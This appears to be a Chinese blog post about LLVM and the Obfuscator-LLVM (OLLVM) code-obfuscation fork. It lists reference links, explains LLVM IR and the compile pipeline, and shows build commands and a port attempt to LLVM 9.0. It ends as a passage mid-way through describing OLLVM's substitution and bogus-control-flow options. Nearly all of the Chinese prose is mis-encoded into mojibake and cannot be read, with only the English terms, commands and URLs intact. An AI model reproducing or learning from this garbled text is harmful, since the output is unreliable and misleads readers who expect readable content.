ï¼šheroimsçš„åšå®¢\nGithub-iamywang/obfuscator\nGithub-HikariObfuscator/Hikari\nGithub-GoSSIP-SJTU/Armariris\nGithub-obfuscator-llvm/obfuscator ï¼šå®˜æ–¹ç‰ˆæœ¬\nobfuscator-wiki\npediy.com---[åŸåˆ›]ollvmå¿«é€Ÿå­¦ä¹ \nllvmå…¥é—¨\nOLLVMä»£ç æ··æ·†ç§»æ¤ä¸ä½¿ç”¨\nllvmå­¦ä¹ ï¼ˆä¸‰ï¼‰ï¼šç§»æ¤ollvmç­‰ä½œå“åˆ°å•ç‹¬ç¼–è¯‘çš„Pass\nè“è‰²çš„å‘³é“ï¼šè°è¯´ä¸èƒ½ä¸é¾™ä¸€èµ·è·³èˆï¼šClang / LLVM\nOLLVMä»£ç æ··æ·†ç§»æ¤ä¸ä½¿ç”¨\nllvmå…¥é—¨ç¬”è®°\nllvmç¼–è¯‘æµç¨‹\nLLVMå­¦ä¹ æ€»ç»“ä¸OLLVMé¡¹ç›®åˆ†æ\nObfuscator-llvmæºç åˆ†æ\nollvmæºç åˆ†æ\n[åŸåˆ›]ollvmæºç åˆ†æ - Passä¹‹Flattening\n[åŸåˆ›]ollvmæºç åˆ†æ - Passä¹‹SplitBaiscBlocks\nGoSSIPå®‰å…¨ç ”ç©¶é¡¹ç›®ï¼šå­¤æŒºèŠ±ï¼ˆArmaririsï¼‰ LLVMæ··æ·†æ¡†æ¶\nä¸ºOLLVMæ·»åŠ å­—ç¬¦ä¸²æ··æ·†åŠŸèƒ½\nllvmä¹‹æ—…ç¬¬å››ç«™ ï¼ ç¼–å†™Pass\nGithub-haidragon / study_obscure\n[åŸåˆ›]Fllvmï¼ˆFuck-ollvmï¼‰ä»‹ç»\n å•¥æ˜¯LLVMï¼Ÿ  [åŸåˆ›]LLVMäº†è§£ç¯‡å‰§åœºç‰ˆ\n ä»¥ä¸Šè¿™ç¯‡æ–‡ç« ç®€è¦åœ°ä»‹ç»äº†LLVM\nLLVMï¼šLow Level Virtual Machine(æœ€åˆ)\nå®˜æ–¹å®šä¹‰ï¼šLLVMæ˜¯ä¸€ä¸ªæ¨¡å—åŒ–å’Œå¯é‡ç”¨çš„ç¼–è¯‘å™¨å’Œå·¥å…·é“¾æŠ€æœ¯çš„é›†åˆ\nLLVMæœ€åˆæ˜¯åœ¨2000å¹´ç”±ä¼Šåˆ©è¯ºä¼Šå¤§å­¦é¦™æ§Ÿåˆ†æ ¡(UUIC)çš„å­¦ç”ŸChris LattneråŠå…¶ç¡•å£«é¡¾é—®Vikram Adveåˆ›å»ºçš„ç ”ç©¶é¡¹ç›®ï¼Œå¹¶åœ¨2003å¹´å‘å¸ƒç¬¬ä¸€ä¸ªæ­£å¼ç‰ˆæœ¬ï¼Œç›®çš„æ˜¯æä¾›ä¸€ç§åŸºäºSSAçš„ç°ä»£ç¼–è¯‘ç­–ç•¥ï¼Œè¿™ç§ç­–ç•¥èƒ½å¤Ÿæ”¯æŒä»»ä½•ç¼–ç¨‹è¯­è¨€çš„é™æ€å’ŒåŠ¨æ€ç¼–è¯‘ã€‚\næœ‰æ„æ€çš„æ˜¯ï¼Œä»–çš„ä½œè€…åŸæœ¬æƒ³è¦å†™ä¸€ä¸ªä½å±‚è™šæ‹Ÿæœºçš„ï¼Œç„¶è€Œä»–å¹¶æ²¡æœ‰è¢«å½“æˆè™šæ‹Ÿæœºæ¥ç”¨ï¼Œé€æ¸åœ°åç¦»äº†ä»–åŸæœ¬çš„æ–¹å‘ã€‚ç°åœ¨llvmä¸æ˜¯ä»»ä½•å•è¯çš„ç¼©å†™ï¼Œè€Œæ˜¯ä¸€ç§ä½“ç³»ï¼ŒåŒ…å«äº†ä¸€ç³»åˆ—çš„é¡¹ç›®\nå¯¹äºLLVMæ ¸å¿ƒï¼ˆLLVM Coreï¼‰æ¥è¯´ï¼Œå®ƒæ˜¯ä¸€ä¸ªç¼–è¯‘å™¨åŸºç¡€è®¾æ–½æ¡†æ¶ï¼Œå®ƒåŒ…å«äº†ä¸ºæˆ‘ä»¬ç¼–å†™ç¼–è¯‘å™¨ä¸€ç³»åˆ—çš„åº“ï¼ˆå¦‚ç¨‹åºåˆ†æã€ä»£ç ä¼˜åŒ–ã€æœºå™¨ä»£ç ç”Ÿæˆç­‰ï¼‰ï¼Œå¹¶ä¸”æä¾›äº†è°ƒç”¨è¿™äº›åº“çš„ç›¸å…³å·¥å…·ï¼Œå¦‚llvm-optå¯ä»¥è°ƒç”¨LLVMä¼˜åŒ–ç›¸å…³çš„åº“ï¼Œllvm-mcå¯ä»¥è°ƒç”¨LLVMæœºå™¨ä»£ç ç”Ÿæˆç›¸å…³çš„åº“ã€‚å¹¶ä¸ºæ­¤æä¾›äº†ä¸€ä¸ªéå¸¸æ–¹ä¾¿ç®€å•ã€å…·å¤‡ç±»å‹çš„ã€å¹³å°æ— å…³çš„ç»Ÿä¸€ä¸­é—´ä»£ç è¯­è¨€ï¼Œç§°ä¹‹ä¸ºLLVM IR.\nä»¥ä¸Šæ˜¯ä¸€ä¸ªæ­£å¸¸ç¼–è¯‘å™¨çš„æµç¨‹ï¼Œæºä»£ç ç»è¿‡å‰ç«¯ç¼–è¯‘æˆä¸­é—´ä»£ç ï¼Œåœ¨ç»è¿‡ä¼˜åŒ–å’Œåç«¯ç”Ÿæˆç›¸åº”çš„æœºå™¨ç ï¼Œå³å¯æ‰§è¡Œæ–‡ä»¶\nLLVMç¼–è¯‘ä¸€ä¸ªæºæ–‡ä»¶çš„è¿‡ç¨‹ï¼šé¢„å¤„ç† -\u003e è¯æ³•åˆ†æ -\u003e Token -\u003e è¯­æ³•åˆ†æ -\u003e AST -\u003e ä»£ç ç”Ÿæˆ -\u003e LLVM IR -\u003e ä¼˜åŒ– -\u003e ç”Ÿæˆæ±‡ç¼–ä»£ç  -\u003e Link -\u003e ç›®æ ‡æ–‡ä»¶\n å…¶ä¸­IR(intermediate representation)æ˜¯å‰ç«¯è¯­è¨€ç”Ÿæˆçš„ä¸­é—´ä»£ç è¡¨ç¤ºï¼Œä¹Ÿæ˜¯Passæ“ä½œçš„å¯¹è±¡ï¼Œå®ƒä¸»è¦åŒ…å«å››ä¸ªéƒ¨åˆ†ï¼š\nï¼ˆ1ï¼‰Moduleï¼šæ¯”å¦‚ä¸€ä¸ª.cæˆ–è€….cppæ–‡ä»¶ã€‚\nï¼ˆ2ï¼‰Functionï¼šä»£è¡¨æ–‡ä»¶ä¸­çš„ä¸€ä¸ªå‡½æ•°ã€‚\nï¼ˆ3ï¼‰BasicBlockï¼šæ¯ä¸ªå‡½æ•°ä¼šè¢«åˆ’åˆ†ä¸ºä¸€äº›blockï¼Œå®ƒçš„åˆ’åˆ†æ ‡å‡†æ˜¯ï¼šä¸€ä¸ªblockåªæœ‰ä¸€ä¸ªå…¥å£å’Œä¸€ä¸ªå‡ºå£ã€‚\nï¼ˆ4ï¼‰Instructionï¼šå…·ä½“çš„æŒ‡ä»¤ã€‚\nIRä¸­å„éƒ¨åˆ†çš„å…·ä½“å…³ç³»å¦‚ä¸‹å›¾ï¼š\n æ‹¿ä¸ªä¾‹å­æ¥è¯´å°±æ˜¯ï¼šé¦–å…ˆï¼Œæˆ‘ä»¬æœ‰Cä»£ç ç¨‹åºæ–‡ä»¶ï¼Œç„¶åç»è¿‡äº†Clangå‰ç«¯ï¼ˆæˆ–è€…å¤è€çš„llvm-gccå‰ç«¯ï¼Œè¿™æ˜¯åœ¨Clangå‡ºç°ä»¥å‰ä½¿ç”¨çš„å‰ç«¯ï¼Œå¯ä»¥äº§ç”ŸLLVM IRï¼‰ï¼Œç„¶åä¼šäº§ç”ŸLLVM IRã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°LLVM IRæ˜¯ä»¥.bcç»“å°¾ï¼Œç¼©å†™ä»£è¡¨çš„å•è¯æ˜¯bitcodeï¼Œå®ƒæ˜¯åºåˆ—åŒ–çš„æ•°æ®ï¼Œç”¨ä»¥å­˜å‚¨åœ¨ç£ç›˜ä¸­ã€‚è€ŒLLVM IRéå¸¸ç‰›é€¼çš„åˆ›å»ºäº†ä¸‰ç§LLVM IRè¡¨ç¤ºæ ¼å¼ï¼Œé™¤äº†bitcodeè¿™ç§ç”¨ä»¥å­˜å‚¨çš„æ ¼å¼ï¼Œç¬¬äºŒç§æ˜¯ç”¨äºäººç±»å¯è¯»çš„çš„æ ¼å¼ï¼Œä¸€èˆ¬ä»¥.llç»“å°¾ã€‚\n1  $ clang a.c -S -emit-llvm# ç”Ÿæˆ.llå¯è¯»æ–‡ä»¶   è¿™æ¡å‘½ä»¤å³å¯äº§ç”Ÿ.llæ–‡ä»¶\nè€Œç¬¬ä¸‰ç§æ ¼å¼åˆ™æ˜¯å†…å­˜è¡¨ç¤ºæ ¼å¼ï¼Œè¿™ä¸€èˆ¬æ˜¯ç”¨äºæˆ‘ä»¬ç¨‹åºå¼€å‘ï¼Œå»æ“ä½œLLVM IRã€‚é‚£ä¹ˆè¿™é‡Œé¢æœ‰ä¸€ä¸ªå®è§‚çš„æ¦‚å¿µï¼Œé‚£å°±æ˜¯ä¸€ä¸ªç¼–è¯‘å•å…ƒï¼ˆå³ä¸€ä¸ª.cæ–‡ä»¶ï¼‰ï¼Œåœ¨LLVM IRä¸­ä»£è¡¨ç€ä¸€ä¸ªModuleï¼Œè€Œä¸€ä¸ªModuleé‡Œé¢å«æœ‰Global Valueï¼Œä¸»è¦åŒ…æ‹¬Global Variable å’Œ Functionï¼Œè€Œè‡³äºGlobal Aliaså¤§å®¶æ¥è§¦æ¯”è¾ƒå°‘ï¼Œæˆ‘ä»¬æš‚æ—¶å¿½ç•¥ã€‚è€Œä¸€ä¸ªFunctioné‡Œé¢åŒ…å«ç€Basic Blockï¼Œè€Œä¸€ä¸ª Basic Blocké‡Œé¢åŒ…å«ç€æŒ‡ä»¤ï¼Œå¦‚addã€‚é‚£ä¹ˆå…³ç³»ä½ å¯ä»¥è®¤ä¸ºæ˜¯Module -\u003e Function -\u003e Basic Block -\u003e Instructions. è¿™æ˜¯ä¸€ä¸ªå®è§‚çš„è®¤è¯†ï¼Œéœ€è¦å…·å¤‡ã€‚è€Œè¿™ä¸€ä¸ªä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸å¸¸å»æŸ¥é˜…çš„ç›¸å…³LLVM IRçš„APIï¼Œå¦‚ï¼šllvm-GlobeValue\nè€Œè¿™é‡Œæ˜ç¡®çš„ä¸€ç‚¹æ˜¯ï¼Œè¿™ä¸‰è€…æ˜¯å®Œå…¨ç­‰ä»·çš„ï¼Œå¹¶ä¸”å¯ä»¥è½¬æ¢çš„\nå†å›åˆ°ä¸Šé¢çš„æµç¨‹å›¾ï¼Œå³äº§ç”Ÿ.bcçš„é˜¶æ®µã€‚äº§ç”Ÿå®Œæ¯•åï¼Œå®ƒè¿™é‡Œç›´æ¥è¿›å…¥llvm-linké˜¶æ®µï¼Œå…¶å®ä¸å¤ªå®Œæ•´ã€‚è‹¥æ˜¯æˆ‘ä»¬ä½¿ç”¨äº†O2ç­‰ä¼˜åŒ–ï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œè¿˜ä¼šç»å†ä¸€ä¸ªä¼˜åŒ–çš„é˜¶æ®µï¼Œå³å¯¹è¿™ä¸€ä¸ªç¼–è¯‘å•å…ƒçš„ä¼˜åŒ–ï¼Œå¤§çº¦åŒ…æ‹¬äº†40å¤šç§ä¼˜åŒ–Passï¼Œå¦‚æ­»ä»£ç æ¶ˆé™¤ï¼Œå†…è”ç­‰ã€‚è€Œç»è¿‡ä¼˜åŒ–åï¼Œä¾ç„¶æ˜¯.bcæ–‡ä»¶ï¼Œç„¶åå†è¿›å…¥llvm-linké˜¶æ®µã€‚è€Œåœ¨llvm-linké˜¶æ®µï¼Œæ‰€è¦åšçš„å…¶å®å°±æ˜¯æŠŠå¤šä¸ª.bcæ–‡ä»¶åˆå¹¶æˆä¸€ä¸ª.bcæ–‡ä»¶ï¼Œå¹¶ä¸”åšé“¾æ¥æ—¶ä¼˜åŒ–ï¼Œåœ¨è¿™ç¯‡æ–‡ç« ä¸­æåˆ°è¿‡ä¸€ä¸ªä¾‹å­ï¼šLLVM Link Time Optimizationï¼Œå¯ä»¥æŸ¥é˜…ä¸€ä¸‹æ˜¯å¦‚ä½•è¿›è¡Œé“¾æ¥æ—¶ä¼˜åŒ–çš„ã€‚\nè€Œç»è¿‡llvm-linké˜¶æ®µåï¼Œæˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªæ–°çš„.bcæ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¼šå†æ¬¡è¿›å…¥ä¼˜åŒ–é˜¶æ®µï¼Œé‡æ–°å†è¿›è¡Œä¸€æ¬¡ä¼˜åŒ–ã€‚å› ä¸ºç»è¿‡llvm-linkåï¼Œæˆ‘ä»¬çš„IRç»“æ„å¯èƒ½å‘ç”Ÿäº†ä¸€äº›å˜åŒ–ï¼Œä»è€Œå¯èƒ½æ›´æœ‰åˆ©äºæˆ‘ä»¬ä¼˜åŒ–ï¼Œå¾—åˆ°æ›´ä¼˜åŒ–çš„IRã€‚è€Œè¿™ä¸€æ­¥éª¤åï¼Œå¯ä»¥å¾—åˆ°æœ€ç»ˆä¼˜åŒ–åçš„.bcï¼Œæ­£å¼è¿›å…¥ä»£ç ç”Ÿæˆé˜¶æ®µã€‚\nè€Œåœ¨è¿™ä¸€å¹…å›¾ä¸­ï¼Œåªåˆ—ä¸¾å‡ºæ¥äº†ä¸€ä¸ªllcï¼Œå³èµ°æœºå™¨ä»£ç ç”Ÿæˆçš„è·¯å¾„ã€‚å…¶å®å¯¹äºLLVMæ¥è¯´ï¼Œè¿˜å¯ä»¥æœ‰ä¸€ä¸ªè¿‡ç¨‹ï¼Œé‚£å°±æ˜¯lliï¼Œå³è§£é‡Šæ‰§è¡ŒLLVM IRã€‚ä¸è¿‡æˆ‘ä»¬è¿™é‡Œä¸å¤šè°ˆï¼Œæˆ‘ä»¬é‡ç‚¹åœ¨æœºå™¨ä»£ç ç”Ÿæˆã€‚é‚£ä¹ˆllcçš„ä½œç”¨å°±æ˜¯æŠŠLLVM IR ç¼–è¯‘æˆæ±‡ç¼–æ–‡ä»¶.sï¼Œè¿™é‡Œä½ å¯ä»¥æŠŠLLVM IRæƒ³è±¡æˆä¸€ä¸ªç¼–ç¨‹è¯­è¨€ï¼Œç„¶åç»è¿‡äº†llcç¼–è¯‘å™¨ï¼Œæœ€åäº§ç”Ÿäº†æ±‡ç¼–æ–‡ä»¶ã€‚å¦‚åŒCç¨‹åºï¼Œç»è¿‡Clangï¼Œäº§ç”Ÿäº†LLVM IRä¸€èˆ¬ã€‚é‚£ä¹ˆï¼Œäº§ç”Ÿäº†æ±‡ç¼–æ–‡ä»¶ä»¥åï¼Œå°±å¯ä»¥è°ƒç”¨ç³»ç»Ÿçš„æ±‡ç¼–å™¨ï¼Œå¦‚GNUçš„asï¼Œä»è€Œäº§ç”Ÿç›®æ ‡æ–‡ä»¶object fileï¼Œå³.oæ–‡ä»¶äº†ã€‚è€Œç»†å¿ƒçš„ç«¥é‹å¯èƒ½æ³¨æ„åˆ°äº†è¿™é‡Œè¿˜æœ‰ä¸€æ¡è·¯å¾„æ˜¯llvm-mcï¼Œç›´æ¥èµ°ç”Ÿæˆobject fileçš„è¿‡ç¨‹ã€‚è€Œè¿™æ¡è·¯å¾„åœ¨å¦‚ä»Šæ¥è¯´ï¼Œå¹¶ä¸æ˜¯æ¯ä¸ªå¹³å°éƒ½ä¼šèµ°ï¼Œæ ¸å¿ƒåœ¨äºLLVMæœ¬èº«çš„é›†æˆæ±‡ç¼–å™¨ï¼Œå³-fintegrated-asï¼Œä½¿ç”¨é›†æˆæ±‡ç¼–å™¨æ—¢å¯ä»¥ä½¿ç”¨MCLoweingåˆ°MCInstï¼Œå†ä½¿ç”¨MCStreamersç›´æ¥åˆ°.oï¼Œå½“ç„¶ä¹Ÿå¯ä»¥åˆ°.sã€‚è€Œç›®å‰æœ¬èº«çš„é›†æˆæ±‡ç¼–å™¨ï¼Œæˆ‘è®¤ä¸ºæ˜¯å¹¶éå®Œç¾ï¼Œä½†æ˜¯ä»¥å‘å±•è¶‹åŠ¿æ¥çœ‹ï¼Œä¼šå¤§ä¸€ç»Ÿçš„ï¼Œä»è€Œåšåˆ°æ²¡æœ‰å¹³å°å·®å¼‚ï¼Œè¿™ä¹Ÿæ˜¯LLVMåšé›†æˆæ±‡ç¼–å™¨çš„ä¸€å¤§ç†ç”±ã€‚è€Œç”Ÿæˆå®Œ.oæ–‡ä»¶ï¼Œå‰©ä¸‹çš„è¿‡ç¨‹å°±å¾ˆç®€å•äº†ï¼Œå°±æ˜¯é“¾æ¥å™¨é“¾æ¥ç›¸å…³çš„åº“ï¼Œç„¶åå’Œç›®æ ‡æ–‡ä»¶ä¸€èµ·ç”Ÿå­˜å¯æ‰§è¡Œæ–‡ä»¶.out / .exeäº†ã€‚\n1 2 3 4 5  # äºŒè¿›åˆ¶ä»£ç å½¢å¼ $ clang -emit-llvm -c main.c -o main.bc # å¯è¯»æ–‡æœ¬ä»£ç å½¢å¼ $ clang -emit-llvm â€“S -c main.c -o main.ll     llvm å’Œ clang çš„å…³ç³»   å¯¹äº LLVM æ¥è¯´ï¼Œå…¶å‰ç«¯æ˜¯ clangï¼Œåœ¨ç¼–è¯‘æºç æ–‡ä»¶çš„æ—¶å€™ä½¿ç”¨çš„ç¼–è¯‘å·¥å…·ä¹Ÿæ˜¯ clangã€‚ è€Œç”Ÿæˆä¸­é—´ IR ä»£ç åï¼Œllvméœ€è¦å¯¹ IR ä»£ç è¿›è¡Œä¸€äº›æ“ä½œï¼Œä¾‹å¦‚æ·»åŠ ä¸€äº›ä»£ç æ··æ·†åŠŸèƒ½ã€‚LLVM çš„åšæ³•æ˜¯é€šè¿‡ç¼–å†™ Pass(å…¶å®å°±æ˜¯å¯¹åº”çš„ä¸€ä¸ªä¸ªæ¨¡å—ï¼Œæ¯ä¸ªç±»å®ç°ä¸åŒçš„åŠŸèƒ½)æ¥å®ç°æ··æ·†çš„åŠŸ èƒ½ã€‚æ‰€ä»¥å®ç°æ··æ·†ï¼Œå…¶å®å°±æ˜¯ç¼–å†™åŠŸèƒ½æ€§çš„ Pass\nObfuscator-LLVM Obfuscator-LLVMæ˜¯ç”±ç‘å£«ä¼Šå¤«å°”ä¸œè±ç­çš„åº”ç”¨ç§‘å­¦ä¸è‰ºæœ¯å¤§å­¦ä¿¡æ¯å®‰å…¨å°ç»„ï¼ˆHEIG-VDï¼‰äº2010å¹´6æœˆå‘èµ·çš„ä¸€ä¸ªé¡¹ç›®ã€‚\nè¯¥é¡¹ç›®çš„ç›®çš„æ˜¯æä¾›LLVMç¼–è¯‘å¥—ä»¶çš„å¼€æºåˆ†æ”¯ï¼Œè¯¥å¥—ä»¶èƒ½å¤Ÿé€šè¿‡ä»£ç æ··æ·†å’Œé˜²ç¯¡æ”¹æ¥æé«˜è½¯ä»¶å®‰å…¨æ€§ã€‚ç”±äºæˆ‘ä»¬ç›®å‰å¤§éƒ¨åˆ†å·¥ä½œåœ¨ä¸­é—´è¡¨ç¤ºï¼ˆIRï¼‰çº§åˆ«ï¼Œå› æ­¤æˆ‘ä»¬çš„å·¥å…·ä¸æ‰€æœ‰ç¼–ç¨‹è¯­è¨€ï¼ˆCï¼ŒC ++ï¼ŒObjective-Cï¼ŒAdaå’ŒFortranï¼‰å’Œç›®æ ‡å¹³å°ï¼ˆx86ï¼Œx86-64ï¼ŒPowerPCï¼ŒPowerPC-64ï¼‰å…¼å®¹ã€‚\nLLVMå½“å‰æ”¯æŒçš„ARMï¼ŒThumbï¼ŒSPARCï¼ŒAlphaï¼ŒCellSPUï¼ŒMIPSï¼ŒMSP430ï¼ŒSystemZå’ŒXCoreï¼‰ã€‚\nObfuscator-LLVMçš„ç›®çš„ä¸»è¦æ˜¯åœ¨ç¼–è¯‘æ—¶å¢å¼ºè½¯ä»¶å°±å¯¹æŠ—å‘å·¥ç¨‹å’Œç¼–è¯‘æ—¶ä¿®æ”¹ï¼ˆåŠ¨æ€è°ƒè¯•ï¼Ÿï¼‰\nInstall å¯ä»¥ç›´æ¥ä»githubä¸Šä¸‹è½½æºç \n1 2 3 4 5 6  $ git clone -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.git $ mkdir build $ cd build # å¦‚æœä¸æƒ³è·‘æµ‹è¯•ç”¨ä¾‹åŠ ä¸Š-DLLVM_INCLUDE_TESTS=OFF  $ cmake -DCMAKE_BUILD_TYPE=Release ../obfuscator/ $ make -j7   ç„¶è€Œæˆ‘åœ¨4æ ¸4Gè™šæ‹Ÿæœºé‡Œç¼–è¯‘å°†è¿‘2hï¼Œè¿˜æŠ¥é”™äº†tcl\næˆ‘ç°åœ¨åªæƒ³å†æ¥å‡ æ ¹å†…å­˜æ¡ :(\n1 2 3 4 5 6  error:virtual memory exhausted:Cannot allocate memory $ make -j7 \u003e\u003e40% $ make -j4 \u003e\u003e95% $ make -j2 \u003e\u003e100%   o-llvmæ‰‹åŠ¨æ‰“åŒ…  http://www.few.vu.nl/~lsc300/LLVM/doxygen/index.html\nAPI Document\n å› ä¸ºæˆ‘ä¸‹çš„ollvm9.0çš„-flaæœ‰bugï¼Œæ‰€ä»¥å†³å®šäº²è‡ªæ‰“åŒ…ä¸€æ³¢ï¼Œé¡ºä¾¿å†æ·±å…¥äº†è§£ollvm\nç”±Diffinityå°†ollvm4.0å’Œllvm4.0è¿›è¡Œå¯¹æ¯”ï¼Œå‘ç°äº†ä»¥ä¸‹æ–‡ä»¶çš„ä¸åŒï¼Œä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬å°†ollvmæ‰“åŒ…è¿›æœ€æ–°çš„llvmä¹Ÿéœ€è¦ä¿®æ”¹ä»¥ä¸‹æ–‡ä»¶ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12  ./include/llvm/Transforms/Obfuscation/ # obfuscationçš„å¤´æ–‡ä»¶ ./include/llvm/Transforms/CryptoUtils.h # obfuscationçš„å¤´æ–‡ä»¶ ./lib/Transforms/IPO/LLVMBuild.txt ./lib/Transforms/IPO/PassManagerBuilder.cpp # Passæ³¨å†Œ ./lib/Transforms/Obfuscation/ # obfuscation source code ./lib/Transforms/CMakeLists.txt ./lib/Transforms/LLVMBuild.txt ./tools/clang # é›†æˆclang,è¦åœ¨gitignoreé‡Œå–æ¶ˆclangçš„æ³¨é‡Š ./.gitignore ./CMakeLists.txt ./CODE_OWNERS.TXT ./LICENSE.TXT   ä»è‡ªå·±çš„githubçš„obfuscatorä»“åº“ä¸­cloneä¸‹æ¥ï¼Œæ³¨æ„ä¸€å®šè¦cloneï¼Œç›´æ¥ä¸‹è½½downloadzipæ²¡æœ‰.gitä¿¡æ¯ï¼Œè™½ç„¶ä»–çœŸçš„å¾ˆæ…¢ã€‚\nç„¶ååˆ›å»ºè‡ªå·±çš„llvm9.0åˆ†æ”¯\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  $ git clone git@github.com:Magic-King/obfuscator.git Cloning into 'obfuscator'... remote: Enumerating objects: 86723, done. remote: Total 86723 (delta 0), reused 0 (delta 0), pack-reused 86723 Receiving objects: 100% (86723/86723), 132.79 MiB | 35.00 KiB/s, done. Resolving deltas: 100% (15346/15346), done. $ git branch -a * master remotes/origin/HEAD -\u003e origin/master remotes/origin/clang-425.0.24 remotes/origin/llvm-3.3 remotes/origin/llvm-3.4 remotes/origin/llvm-3.5 remotes/origin/llvm-3.6.1 remotes/origin/llvm-4.0 remotes/origin/master $ git branch -r origin/HEAD -\u003e origin/master origin/clang-425.0.24 origin/llvm-3.3 origin/llvm-3.4 origin/llvm-3.5 origin/llvm-3.6.1 origin/llvm-4.0 origin/master $ git remote add origin git@github.com:Magic-King/obfuscator.git fatal: remote origin already exists. $ git checkout -b llvm-9.0 Switched to a new branch 'llvm-9.0 $ git push origin llvm-9.0 Total 0 (delta 0), reused 0 (delta 0) remote: remote: Create a pull request for 'llvm-9.0' on GitHub by visiting: remote: https://github.com/Magic-King/obfuscator/pull/new/llvm-9.0 remote: To github.com:Magic-King/obfuscator.git * [new branch] llvm-9.0 -\u003e llvm-9.0   ç„¶åæŠŠæœ€æ–°çš„llvm9.0.1æ”¾å…¥obfuscator/æ–‡ä»¶å¤¹ä¸‹ï¼ŒæŠŠclangæ”¾å…¥ obfuscator/tools/clangé‡Œ\nç„¶åå°†obfuscator-llvm4.0ç§»æ¤åˆ°obfuscateé‡Œï¼Œå…·ä½“å¯ä»¥æŸ¥çœ‹æˆ‘çš„githubçš„commitè®°å½•\nç½‘å€å¦‚ä¸‹ï¼šhttps://github.com/Magic-King/obfuscator/commits/llvm-9.0\nä½†æ˜¯ï¼Œæ‰‹åŠ¨æ‰“åŒ…ä¹‹åï¼Œ-flaè¿˜æ˜¯æœ‰é—®é¢˜ï¼Œä¸è¿‡å…¶ä»–é€‰é¡¹å€’æ˜¯æ²¡é—®é¢˜ï¼Œåº”è¯¥æ˜¯-flaå’Œllvm-9.0ä¸å…¼å®¹çš„é—®é¢˜\no-llvmçš„ç‰¹ç‚¹  nstructions Substitution -mllvm -subï¼šæŒ‡ä»¤æ›¿æ¢ Bogus Control Flow -mllvm -bcfï¼šä¼ªæ§åˆ¶æµ Control Flow Flattening -mllvm -flaï¼šæ¿€æ´»æ§åˆ¶æµæ‰å¹³åŒ– Functions annotationsï¼šå¯ä»¥é’ˆå¯¹ä¸€äº›ç‰¹å®šå‡½æ•°è¿›è¡Œæ··æ·†ï¼ˆé€‰æ‹©æ€§æ··æ·†ï¼‰  nstructions Substitution è¿™ç§æ··æ·†æŠ€æœ¯çš„ç›®æ ‡ä»…åœ¨äºç”¨åŠŸèƒ½ä¸Šç­‰æ•ˆä½†æ›´å¤æ‚çš„æŒ‡ä»¤åºåˆ—ä»£æ›¿æ ‡å‡†çš„äºŒè¿›åˆ¶è¿ç®—ç¬¦ï¼ˆå¦‚åŠ ï¼Œå‡æˆ–å¸ƒå°”è¿ç®—ç¬¦ï¼‰ã€‚å½“å‡ ä¸ªç­‰æ•ˆçš„æŒ‡ä»¤åºåˆ—å¯ç”¨æ—¶ï¼Œéšæœºé€‰æ‹©ä¸€ä¸ªã€‚\nè¿™ç§æ··æ·†éå¸¸ç®€å•ï¼Œå¹¶ä¸”ä¸ä¼šå¢åŠ å¾ˆå¤šå®‰å…¨æ€§ï¼Œå› ä¸ºå¯ä»¥é€šè¿‡é‡æ–°ä¼˜åŒ–ç”Ÿæˆçš„ä»£ç è½»æ¾åœ°å°†å…¶åˆ é™¤ã€‚ä½†æ˜¯ï¼Œå¦‚æœä¼ªéšæœºæ•°å‘ç”Ÿå™¨ä½¿ç”¨ä¸åŒçš„å€¼ä½œä¸ºç§å­ï¼Œåˆ™æŒ‡ä»¤æ›¿æ¢ä¼šåœ¨ç”Ÿæˆçš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­å¸¦æ¥å¤šæ ·æ€§ã€‚\nå½“å‰ï¼Œåªæœ‰æ•´æ•°è¿ç®—ç¬¦å¯ç”¨ï¼Œå› ä¸ºç”¨æµ®ç‚¹å€¼æ›¿ä»£è¿ç®—ç¬¦ä¼šå¸¦æ¥èˆå…¥è¯¯å·®å’Œä¸å¿…è¦çš„æ•°å€¼è¯¯å·®ã€‚\nå¯ç”¨çš„ç¼–è¯‘å™¨é€‰é¡¹ï¼š\n -mllvm -subï¼šæ¿€æ´»æŒ‡ä»¤æ›¿æ¢ -mllvm -sub_loop=3ï¼šå¦‚æœæ¿€æ´»äº†é€šè¡Œè¯ï¼Œåˆ™å°†å…¶åº”ç”¨åˆ°åŠŸèƒ½ä¸Š3æ¬¡ã€‚é»˜è®¤å€¼ï¼š1ã€‚  wikiä¸­æåˆ°äº†å¯æ›¿æ¢çš„è¿ç®—ï¼šaddã€subã€andã€orã€xorã€‚\nBogus Control Flow è¯¥æ–¹æ³•é€šè¿‡åœ¨å½“å‰åŸºæœ¬å—ä¹‹å‰æ·»åŠ ä¸€ä¸ªåŸºæœ¬å—æ¥ä¿®æ”¹å‡½æ•°è°ƒç”¨å›¾ã€‚è¿™ä¸ªæ–°çš„åŸºæœ¬å—åŒ…å«ä¸€ä¸ªä¸é€æ˜çš„è°“è¯ï¼Œç„¶åæœ‰æ¡ä»¶åœ°è·³è½¬åˆ°åŸå§‹çš„åŸºæœ¬å—ã€‚\nåŸå§‹çš„åŸºæœ¬å—ä¹Ÿå°†è¢«å…‹éš†å¹¶å¡«å……ä»¥éšæœºé€‰æ‹©çš„åƒåœ¾æŒ‡ä»¤ã€‚\nå¯ç”¨çš„ç¼–è¯‘å™¨é€‰é¡¹ï¼š\n -mllvm -bcfï¼šæ¿€æ´»ä¼ªæ§åˆ¶æµç¨‹ -mllvm -bcf_loop=3ï¼šå¦‚æœæ¿€æ´»äº†é€šè¡Œè¯ï¼Œåˆ™å°†å…¶åº”ç”¨åˆ°åŠŸèƒ½ä¸Š3æ¬¡ã€‚é»˜è®¤å€¼ï¼š1 -mllvm -bcf_prob=40ï¼šå¦‚æœæ¿€æ´»äº†é€šè¡Œè¯ï¼Œåˆ™åŸºæœ¬å›¢å—å°†ä»¥40ï¼…çš„æ¦‚ç‡è¢«æ··æ·†ã€‚é»˜è®¤å€¼ï¼š30  Control Flow Flattening 